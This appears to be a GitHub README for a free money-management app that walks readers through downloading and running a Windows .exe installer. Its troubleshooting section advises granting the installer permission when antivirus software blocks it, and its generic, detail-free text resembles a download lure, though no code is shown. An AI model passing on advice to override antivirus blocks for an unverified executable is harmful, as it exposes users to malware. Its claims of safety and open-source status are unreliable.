# 💰 app-money-management - Track your daily spending with ease

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Tiyinmontezumasrevenge20/app-money-management)

This application helps you manage your money. You can track your daily transactions, monitor your spending habits, and secure your financial data. The software works on Windows computers and Android devices. It stays fast and simple so you spend less time managing files and more time managing your budget.

## 📥 How to Install on Windows

To start using this application on your Windows computer, follow these steps:

1. Visit the [official download page](https://github.com/Tiyinmontezumasrevenge20/app-money-management).
2. Locate the section labeled Releases on the right side of the page.
3. Click on the latest release version.
4. Find the file ending in .exe under the Assets heading.
5. Click this file to download it to your computer.
6. Open your Downloads folder and double-click the file to start the installer.
7. Follow the prompts on your screen to finish the setup.
8. Once finished, find the money management icon on your desktop or start menu to open the app.

## 🛠 System Requirements

This application runs on most modern desktop environments. Please ensure your computer meets these basic needs before installation:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4GB of RAM.
*   Storage: 200MB of free space on your hard drive.
*   Internet: A connection is beneficial for initial installation and sync functions.

## ✨ Key Features

This app includes tools to simplify your financial life.

### Budget Tracking
You can input your income and expenses as they happen. The interface displays your current balance clearly. You can categorize your entries to see where your money goes each month.

### Multi-language Support
The application speaks your language. You can switch between different languages in the settings menu. This ensures that everyone can track their money without confusion.

### Security
Your data stays on your device. We prioritize privacy by keeping your financial logs local. You can add a passcode to the application to keep your records private from others who use your computer.

### Fast Performance
The app uses modern web technology to stay responsive. It opens quickly and processes your entries without lag. 

## ❓ Frequently Asked Questions

### Does this app charge fees?
No. This software is open-source and free for all users.

### Can I sync data between my phone and computer?
Yes. You can mirror your data across your Android phone and Windows computer. Install the app on both devices and use the import or export feature in the settings to move your database files.

### Is my bank data safe?
This application does not connect to your bank accounts. You enter your transactions manually. Because the app never connects to your bank, your login credentials for your financial institutions remain secure.

### How do I report a bug?
If the app stops working or shows an error, visit the Issues tab on our project page. Write a description of what happened and click Submit. Our team reviews these notes to fix the problems in future updates.

## ⚙️ Settings and Customization

You can change how the app looks and feels in the Settings menu. Click the gear icon in the top corner to access these options:

*   Display: Choose between light mode and dark mode.
*   Language: Select your preferred language from the list.
*   Currency: Set your primary currency for all calculations.
*   Data: Use the backup option to save a copy of your records to a folder of your choosing.

## 🚀 Troubleshooting

If the installer does not run, check these steps:

1. Restart your computer and try again.
2. Check if your antivirus software blocked the file. If it did, you may need to grant permission to run the installer.
3. Ensure you have an active internet connection during the download process.
4. If the app displays a white screen, close the app completely and open it again. This usually clears temporary loading errors.
